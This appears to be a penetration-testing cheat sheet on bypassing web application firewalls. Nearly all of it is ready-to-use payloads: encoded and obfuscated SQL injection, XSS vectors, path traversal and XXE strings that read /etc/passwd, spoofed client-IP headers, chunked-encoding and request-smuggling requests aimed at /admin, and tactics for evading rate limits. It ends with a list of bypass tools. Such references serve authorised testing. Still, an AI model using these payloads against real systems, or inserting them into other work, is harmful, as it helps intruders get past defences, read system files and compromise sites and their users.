# WAF Bypass Techniques

## Overview
Web Application Firewall bypass techniques to evade detection and filtering while testing security controls.

## Detection
- Identify WAF vendor: check headers (X-Sucuri-ID, X-Firewall, Server: cloudflare, X-CDN)
- Send malicious payload and observe: 403/406/429 = WAF present
- Check for WAF fingerprints: `wafw00f https://target.com`

## Encoding Bypasses
```
# URL encoding
<script> → %3Cscript%3E
' → %27, " → %22

# Double URL encoding
< → %253C, > → %253E

# Unicode encoding
<script> → \u003cscript\u003e
' → \u0027

# HTML entity encoding
< → &lt; > → &gt; " → &quot; ' → &#x27;

# Base64 in contexts that decode it
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

# Hex encoding
SELECT → 0x53454c454354
```

## Case & Space Manipulation
```
# Mixed case
SeLeCt, ScRiPt, aLeRt

# Comments as whitespace (SQL)
SELECT/**/FROM/**/users
SE/**/LECT * FR/**/OM users

# Whitespace alternatives
SELECT%09FROM  (tab)
SELECT%0aFROM  (newline)
SELECT%0dFROM  (carriage return)
SELECT%0cFROM  (form feed)

# Plus signs
SELECT+*+FROM+users
```

## SQL Injection WAF Bypass
```
# Inline comments
/*!SELECT*/ * /*!FROM*/ users
/*!50000SELECT*/ * FROM users

# Case variations
SeLeCt * FrOm users WhErE id=1

# Concatenation
'||'1'='1
CONCAT(0x61,0x64,0x6d,0x69,0x6e)

# Equivalents
AND → &&, OR → ||
= → LIKE, = → REGEXP
SLEEP(5) → BENCHMARK(5000000,MD5(1))

# No-space bypass
SELECT(*)FROM(users)
```

## XSS WAF Bypass
```
# Tag variations
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<script/src="data:,alert(1)">
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

# Attribute variations
onmouseover = "alert(1)"
onerror =    alert(1)   
onclick\t=alert(1)

# Protocol bypass
javascript:alert(1)
jAvAsCrIpT:alert(1)
java&#x09;script:alert(1)
java	script:alert(1)

# Event handler variations
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert(1)>
<a href="javascript&colon;alert(1)">click</a>

# Filter evasion
<scr<script>ipt>alert(1)</scr</script>ipt>
```

## Path Traversal WAF Bypass
```
# Encoding variations
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double slash
//etc//passwd
....//....//....//etc/passwd

# Null bytes
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

## HTTP Header Bypass
```
# IP spoofing headers (bypass IP-based rules)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1

# Content-Type bypass
Content-Type: application/json → application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: application/xml

# Method override
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
```

## Chunked Transfer Bypass
```
Transfer-Encoding: chunked

# Split payload across chunks to bypass inspection
POST /login HTTP/1.1
Transfer-Encoding: chunked

5
param
4
=val
0
```

## Request Smuggling for WAF Bypass
```
# CL.TE or TE.CL to smuggle past WAF inspection
Content-Length: 78
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

## JSON/XML Bypass
```
# JSON variations
{"user": "admin'--"}
{"user":/*comment*/"admin"}

# XML variations
<data><![CDATA[<script>alert(1)</script>]]></data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

## Rate Limit / Volume Bypass
```
# Distribute requests across IPs
# Slow down request rate
# Use different User-Agents
# Rotate sessions/cookies
# Use CDN/proxy chains
```

## Tools
- `wafw00f` — WAF fingerprinting
- `sqlmap --tamper` — tamper scripts for SQLi WAF bypass
- `bypass-firewalls-by-DNS-history` — find real IP behind WAF
- `nuclei -t waf-bypass` — automated bypass testing
- Burp Suite with WAF bypass extensions
